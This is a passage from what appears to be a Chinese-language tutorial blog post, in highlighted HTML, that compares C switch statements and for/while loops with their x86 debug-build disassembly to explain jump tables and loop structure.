class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D82E EB <span class=\"number\">2B</span>                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d85b)</span></span><br><span class=\"line\"><span class=\"function\">$L537:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D830 <span class=\"number\">68</span> <span class=\"number\">24</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;9&quot;</span> (<span class=\"number\">00422024</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D835 E8 <span class=\"number\">06</span> <span class=\"number\">39</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D83A <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D83D EB <span class=\"number\">1</span>C                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d85b)</span></span><br><span class=\"line\"><span class=\"function\">$L539:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D83F <span class=\"number\">68</span> <span class=\"number\">20</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;A&quot;</span> (<span class=\"number\">00422020</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D844 E8 F7 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D849 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D84C EB <span class=\"number\">0</span>D                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d85b)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D84E <span class=\"number\">68</span> <span class=\"number\">1</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;sb&quot;</span> (<span class=\"number\">0042201</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D853 E8 E8 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D858 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85B <span class=\"number\">5F</span>                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85C <span class=\"number\">5</span>E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85D <span class=\"number\">5B</span>                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85E <span class=\"number\">83</span> C4 <span class=\"number\">44</span>             add         esp,<span class=\"number\">44</span>h</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D861 <span class=\"number\">3B</span> EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D863 E8 <span class=\"number\">58</span> <span class=\"number\">39</span> FF FF       call        __chkesp (<span class=\"number\">004011</span>c0)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D868 <span class=\"number\">8B</span> E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D86A <span class=\"number\">5</span>D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D86B C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D86C  <span class=\"number\">12</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  .谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D870  <span class=\"number\">21</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  !谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D874  <span class=\"number\">30</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  <span class=\"number\">0</span>谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D878  <span class=\"number\">3F</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  ?谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D87C  <span class=\"number\">4</span>E D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  N谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D880  <span class=\"number\">00</span> <span class=\"number\">04</span> <span class=\"number\">04</span> <span class=\"number\">04</span>  ....</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D884  <span class=\"number\">04</span> <span class=\"number\">04</span> <span class=\"number\">04</span> <span class=\"number\">01</span>  ....</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D888  <span class=\"number\">02</span> <span class=\"number\">03</span> CC CC  ..烫</span></span><br><span class=\"line\"><span class=\"function\">//中间的<span class=\"number\">04</span>就是代替大表中的default</span></span><br><span class=\"line\"><span class=\"function\">//如果空缺的太多会生成一张小表来替代大表中default填充，变为大表加小表</span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\">//差值过大</span></span><br><span class=\"line\"><span class=\"function\">void func(int x)</span></span><br><span class=\"line\"><span class=\"function\">&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1301</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">5308</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;8&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">10309</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;9&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">20310</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;A&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sb&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D7D0 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D1 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D3 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D6 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D7 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D8 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D9 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7DC B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E1 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E6 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E8 <span class=\"number\">8B</span> <span class=\"number\">45</span> <span class=\"number\">08</span>             mov         eax,dword ptr [ebp+<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EB <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EE <span class=\"number\">81</span> <span class=\"number\">7</span>D FC <span class=\"number\">45</span> <span class=\"number\">28</span> <span class=\"number\">00</span> <span class=\"number\">00</span> cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">2845</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F5 <span class=\"number\">7F</span> <span class=\"number\">1</span>D                jg          func+<span class=\"number\">44</span>h (<span class=\"number\">0040</span>d814)</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F7 <span class=\"number\">81</span> <span class=\"number\">7</span>D FC <span class=\"number\">45</span> <span class=\"number\">28</span> <span class=\"number\">00</span> <span class=\"number\">00</span> cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">2845</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7FE <span class=\"number\">74</span> <span class=\"number\">3</span>D                je          func+<span class=\"number\">6</span>Dh (<span class=\"number\">0040</span>d83d)</span><br><span class=\"line\"><span class=\"number\">0040</span>D800 <span class=\"number\">81</span> <span class=\"number\">7</span>D FC <span class=\"number\">15</span> <span class=\"number\">05</span> <span class=\"number\">00</span> <span class=\"number\">00</span> cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">515</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D807 <span class=\"number\">74</span> <span class=\"number\">16</span>                je          func+<span class=\"number\">4F</span>h (<span class=\"number\">0040</span>d81f)</span><br><span class=\"line\"><span class=\"number\">0040</span>D809 <span class=\"number\">81</span> <span class=\"number\">7</span>D FC BC <span class=\"number\">14</span> <span class=\"number\">00</span> <span class=\"number\">00</span> cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">14B</span>Ch</span><br><span class=\"line\"><span class=\"number\">0040</span>D810 <span class=\"number\">74</span> <span class=\"number\">1</span>C                je          func+<span class=\"number\">5</span>Eh (<span class=\"number\">0040</span>d82e)</span><br><span class=\"line\"><span class=\"number\">0040</span>D812 EB <span class=\"number\">47</span>                jmp         func+<span class=\"number\">8B</span>h (<span class=\"number\">0040</span>d85b)</span><br><span class=\"line\"><span class=\"number\">0040</span>D814 <span class=\"number\">81</span> <span class=\"number\">7</span>D FC <span class=\"number\">56</span> <span class=\"number\">4F</span> <span class=\"number\">00</span> <span class=\"number\">00</span> cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">4F</span>56h</span><br><span class=\"line\"><span class=\"number\">0040</span>D81B <span class=\"number\">74</span> <span class=\"number\">2F</span>                je          func+<span class=\"number\">7</span>Ch (<span class=\"number\">0040</span>d84c)</span><br><span class=\"line\"><span class=\"number\">0040</span>D81D EB <span class=\"number\">3</span>C                jmp         func+<span class=\"number\">8B</span>h (<span class=\"number\">0040</span>d85b)</span><br><span class=\"line\"><span class=\"number\">0040</span>D81F <span class=\"number\">68</span> <span class=\"number\">2</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;1&quot;</span> (<span class=\"number\">0042202</span>c)</span><br><span class=\"line\"><span class=\"number\">0040</span>D824 E8 <span class=\"number\">17</span> <span class=\"number\">39</span> <span class=\"function\">FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D829 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D82C EB 3A                jmp         func+98<span class=\"title\">h</span> <span class=\"params\">(<span class=\"number\">0040</span>d868)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D82E 68 28 20 42 00       push        offset string &quot;8&quot; <span class=\"params\">(<span class=\"number\">00422028</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D833 E8 08 39 FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D838 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D83B EB 2B                jmp         func+98<span class=\"title\">h</span> <span class=\"params\">(<span class=\"number\">0040</span>d868)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D83D 68 24 20 42 00       push        offset string &quot;9&quot; <span class=\"params\">(<span class=\"number\">00422024</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D842 E8 F9 38 FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D847 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D84A EB 1C                jmp         func+98<span class=\"title\">h</span> <span class=\"params\">(<span class=\"number\">0040</span>d868)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D84C 68 20 20 42 00       push        offset string &quot;A&quot; <span class=\"params\">(<span class=\"number\">00422020</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D851 E8 EA 38 FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D856 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D859 EB 0D                jmp         func+98<span class=\"title\">h</span> <span class=\"params\">(<span class=\"number\">0040</span>d868)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D85B 68 1C 20 42 00       push        offset string &quot;sb&quot; <span class=\"params\">(<span class=\"number\">0042201</span>c)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D860 E8 DB 38 FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D865 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D868 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040D869 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040D86A 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040D86B 83 C4 44             add         esp,44h</span></span><br><span class=\"line\"><span class=\"function\">0040D86E 3B EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\">0040D870 E8 4B 39 FF FF       call        __<span class=\"title\">chkesp</span> <span class=\"params\">(<span class=\"number\">004011</span>c0)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D875 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D877 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040D878 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"comment\">//用case最大的-case最小的，得出的范围称为k，如果要判断的值-case最小的值不在范围k之内，直接default</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"comment\">//edx 存放的是a 与case 中最小值的差值，而eax*4+地址存放的是每个case的地址</span></span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230123120353631.png\" alt=\"image-20230123120353631\"></p>\n<h3 id=\"循环对比分析\"><a class=\"markdownIt-Anchor\" href=\"#循环对比分析\">#</a> 循环对比分析</h3>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func2</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">10</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,i);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D920 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D921 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D923 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D926 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D927 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D928 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D929 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D92C B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D931 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D936 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D938 C7 <span class=\"number\">45</span> FC <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span>\t\t\t\t\t\t\t;<span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"number\">0040</span>D93F EB <span class=\"number\">09</span>                jmp         func2+<span class=\"number\">2</span>Ah (<span class=\"number\">0040</span>d94a)</span><br><span class=\"line\"><span class=\"number\">0040</span>D941 <span class=\"number\">8B</span> <span class=\"number\">45</span> FC             mov         eax,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D944 <span class=\"number\">83</span> C0 <span class=\"number\">01</span>             add         eax,<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D947 <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D94A <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">0</span>A          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span>Ah\t\t\t\t\t\t\t;i&lt;=<span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D94E <span class=\"number\">7F</span> <span class=\"number\">13</span>                jg          func2+<span class=\"number\">43</span>h (<span class=\"number\">0040</span>d963)\t\t\t\t\t\t\t;i&gt;<span class=\"number\">10</span>,ret</span><br><span class=\"line\"><span class=\"number\">0040</span>D950 <span class=\"number\">8B</span> <span class=\"number\">4</span>D FC             mov         ecx,dword ptr [ebp<span class=\"number\">-4</span>]\t\t\t\t\t\t\t;i&lt;=<span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D953 <span class=\"number\">51</span>                   push        ecx\t\t\t\t\t\t\t\t\t\t\t;ecx = i</span><br><span class=\"line\"><span class=\"number\">0040</span>D954 <span class=\"number\">68</span> C4 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;%d\\n&quot;</span> (<span class=\"number\">00422f</span>c4)</span><br><span class=\"line\"><span class=\"number\">0040</span>D959 E8 E2 <span class=\"number\">37</span> FF FF       call        <span class=\"built_in\">printf</span> (<span class=\"number\">00401140</span>)</span><br><span class=\"line\"><span class=\"number\">0040</span>D95E <span class=\"number\">83</span> C4 <span class=\"number\">08</span>             add         esp,<span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D961 EB DE                jmp         func2+<span class=\"number\">21</span>h (<span class=\"number\">0040</span>d941)</span><br><span class=\"line\"><span class=\"number\">0040</span>D963 <span class=\"number\">5F</span>                   pop         edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D964 <span class=\"number\">5</span>E                   pop         esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D965 <span class=\"number\">5B</span>                   pop         ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D966 <span class=\"number\">83</span> C4 <span class=\"number\">44</span>             add         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D969 <span class=\"number\">3B</span> EC                cmp         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D96B E8 <span class=\"number\">50</span> <span class=\"number\">38</span> FF FF       call        __chkesp (<span class=\"number\">004011</span>c0)</span><br><span class=\"line\"><span class=\"number\">0040</span>D970 <span class=\"number\">8B</span> E5                mov         esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D972 <span class=\"number\">5</span>D                   pop         ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D973 C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"built_in\">func3</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(i&lt;=<span class=\"number\">10</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,i);</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D980 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D981 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D983 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D986 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D987 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D988 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D989 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D98C B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D991 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D996 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D998 C7 <span class=\"number\">45</span> FC <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D99F <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">0</span>A          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">0</span>Ah</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A3 <span class=\"number\">7F</span> <span class=\"number\">1</span>C                jg          func3+<span class=\"number\">41</span>h (<span class=\"number\">0040</span>d9c1)</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A5 <span class=\"number\">8B</span> <span class=\"number\">45</span> FC             mov         eax,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A8 <span class=\"number\">50</span>                   push        eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D9A9 <span class=\"number\">68</span> C4 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;%d\\n&quot;</span> (<span class=\"number\">00422f</span>c4)</span><br><span class=\"line\"><span class=\"number\">0040</span>D9AE E8 <span class=\"number\">8</span>D <span class=\"number\">37</span> <span class=\"function\">FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D9B3 83 C4 08             add         esp,8</span></span><br><span class=\"line\"><span class=\"function\">0040D9B6 8B 4D FC             